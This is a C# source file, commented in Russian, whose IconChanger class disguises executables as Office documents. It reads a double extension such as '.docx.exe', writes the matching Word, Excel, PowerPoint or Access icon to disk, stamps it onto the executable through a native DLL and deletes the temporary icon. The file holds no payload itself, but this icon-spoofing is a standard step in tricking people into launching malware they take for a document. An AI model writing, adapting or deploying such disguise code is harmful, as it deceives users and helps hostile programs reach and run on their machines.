using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Instruments
{
    public class IconChanger
    {
        private enum FileType { Word, Access, Excel, PowerPoint };
        [DllImport("IconChanger.dll")]
        static extern void ChangeIcon(String executableFile, String iconFile, short imageCount);

        /// <summary>
        /// Изменяет иконку исполняемого фала
        /// </summary>
        /// <param name="exeFilePath">Путь исполняемого файла</param>
        /// <param name="iconFilePath">Путь иконки</param>
        static private void ChangeIcon(string exeFilePath, string iconFilePath)
        {
            short imageCount = 0;

            using (StreamReader sReader = new StreamReader(iconFilePath))
            {
                using (BinaryReader bReader = new BinaryReader(sReader.BaseStream))
                {
                    // Retrieve icon count inside icon file
                    bReader.ReadInt16();
                    bReader.ReadInt16();
                    imageCount = bReader.ReadInt16();//закоментить
                }
            }
            // Change the executable's icon
            ChangeIcon(exeFilePath, iconFilePath, imageCount);
        }
        /// <summary>
        /// Изменяет иконку исполняемого файла , в зависимости от его расширения
        /// </summary>
        /// <param name="exeFilePath">Путь исполняемого файла</param>
        static public void ChangeIcon(string exeFilePath)
        {
            Dictionary<FileType, Icon> IconDict = GetIconDict();

            string[] splitted = exeFilePath.Split(new char[] { '.' });
            string type = splitted[splitted.Length - 2];
            FileType ftype = FileType.Word;

            switch (type)
            {
                case "doc":
                case "docx":
                    ftype = FileType.Word;
                    break;
                case "xls":
                case "xlsx":
                    ftype = FileType.Excel;
                    break;
                case "ppt":
                case "pptx":
                    ftype = FileType.PowerPoint;
                    break;
                case "accdb":
                    ftype = FileType.Access;
                    break;
                default:
                    return;
            }

            SaveIcon(ftype, exeFilePath, IconDict);
            string iconFilePath = Path.GetDirectoryName(exeFilePath) + "\\icon123.ico";
            
            ChangeIcon(exeFilePath, iconFilePath);
            File.Delete(iconFilePath);
        }
        /// <summary>
        /// Сохранение иконки в папку исполняемого файла, в зависимости от его расширения
        /// </summary>
        /// <param name="icon">Тип иконки</param>
        /// <param name="exeFilePath">Путь исполняемого файла</param>
        /// <param name="IconDict">Словарь (тип иконки - иконка) </param>
        static private void SaveIcon(FileType icon, string exeFilePath, Dictionary<FileType, Icon> IconDict)
        {
            try
            {
                using (FileStream fs = new FileStream(Path.GetDirectoryName(exeFilePath) + "\\icon123.ico", FileMode.Create))
                {
                    IconDict[icon].Save(fs);
                }
            }
            catch { }
        }
        /// <summary>
        /// Составление словаря (тип иконки - иконка)
        /// </summary>
        /// <returns></returns>
        static private Dictionary<FileType, Icon> GetIconDict()
        {
            Dictionary<FileType,Icon> dict = new Dictionary<FileType, Icon>();
            dict.Add(FileType.Access, Resources.Access);
            dict.Add(FileType.Word, Resources.Word);
            dict.Add(FileType.Excel, Resources.Excel);
            dict.Add(FileType.PowerPoint, Resources.PowerPoint);
            return dict;
        }
    }
}
